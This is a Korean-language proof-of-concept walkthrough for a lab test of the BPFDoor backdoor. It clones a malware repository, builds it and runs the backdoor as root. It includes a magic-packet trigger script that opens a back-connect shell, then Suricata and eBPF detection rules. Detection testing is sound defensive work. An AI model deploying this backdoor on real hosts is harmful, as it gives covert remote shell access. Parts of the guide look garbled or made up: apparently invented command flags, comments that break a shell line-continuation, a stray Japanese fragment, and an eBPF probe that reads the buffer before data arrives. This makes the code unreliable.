아래는 malwaredevil/BPFDoor-Backdoor 리포지토리를 이용한 PoC(Proof-of-Concept) 구성 예시입니다.  
→ **격리된 테스트 VM**(예: VirtualBox/KVM) 또는 Docker 컨테이너에서만 실행하세요!  

---

## 1. 테스트 환경 준비

- **OS**: Ubuntu 22.04 (또는 Rocky Linux 9)
- **필수 패키지**:
  ```bash
  sudo apt-get update
  sudo apt-get install -y build-essential git python3 python3-pip bpfcc-tools
  ```
- **네트워크**: VM은 호스트 전용 또는 내부 브리지로 외부 접근을 차단

---

## 2. 백도어 소스 클론 & 빌드

```bash
git clone https://github.com/malwaredevil/BPFDoor-Backdoor.git
cd BPFDoor-Backdoor
make
# → 결과물: ./bpfdoor
```

---

## 3. 백도어 실행 (Victim)

```bash
# 루트 권한으로 실행
sudo ./bpfdoor \
  --listen-ip 0.0.0.0 \   # 수신할 IP
  --listen-port 9999      # 매직 패킷 포트
```

> 이 상태로 대기하면, 지정한 UDP 포트로 “magic sequence”를 받았을 때 쉘(Back-Connect)을 열きます。

---

## 4. 매직 패킷 송신 (Attacker)

```bash
# send_magic.py
import socket

MAGIC = b'MAGICPING'          # 리포지토리 코드에 맞춰  
TARGET = ("192.168.56.101", 9999)  # Victim IP:Port

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(MAGIC, TARGET)
print("sent magic packet")
```

```bash
python3 send_magic.py
```

→ Victim 쪽에서 `nc` 등으로 쉘이 뜨는지 확인

---

## 5. 탐지 시나리오

### 5.1 Suricata 룰

```yaml
# /etc/suricata/rules/bpfdoor.rules
alert udp any any -> any 9999 \
  (msg:"[PoC] BPFDoor magic packet"; content:"MAGICPING"; sid:9000001; rev:1;)
```

```bash
sudo suricata -c /etc/suricata/suricata.yaml --af-packet any -S /etc/suricata/rules/bpfdoor.rules
```

---

### 5.2 eBPF 실시간 모니터링 (bcc 사용)

```python
# detect_bpfdoor.py
from bcc import BPF

prog = r"""
int kprobe__sys_recvfrom(struct pt_regs *ctx) {
    // buf 포인터는 PT_REGS_PARM2(ctx)
    char buf[8];
    bpf_probe_read(&buf, sizeof(buf), (void *)PT_REGS_PARM2(ctx));
    // "MAGICPIN" 검사 (마지막 G는 다음 바이트)
    if (buf[0]=='M' && buf[1]=='A' && buf[2]=='G' && buf[3]=='I'
     && buf[4]=='C' && buf[5]=='P' && buf[6]=='I' && buf[7]=='N') {
        bpf_trace_printk(">> BPFDoor trigger detected\\n");
    }
    return 0;
}
"""
b = BPF(text=prog)
print("Tracing recvfrom() for magic… Ctrl-C to exit")
b.trace_print()
```

```bash
sudo python3 detect_bpfdoor.py
```

→ magic 패킷을 받을 때마다 `>> BPFDoor trigger detected` 로그 출력

---

## 6. 전체 PoC 흐름

1. **Victim VM** 에 Suricata (또는 eBPF 스크립트)로 모니터링 시작  
2. **Victim VM** 에서 `sudo ./bpfdoor` 실행  
3. **Attacker VM** 에서 `python3 send_magic.py` 실행  
4. Suricata 경고 발생 또는 eBPF 로그 확인 → 공격 탐지  

---
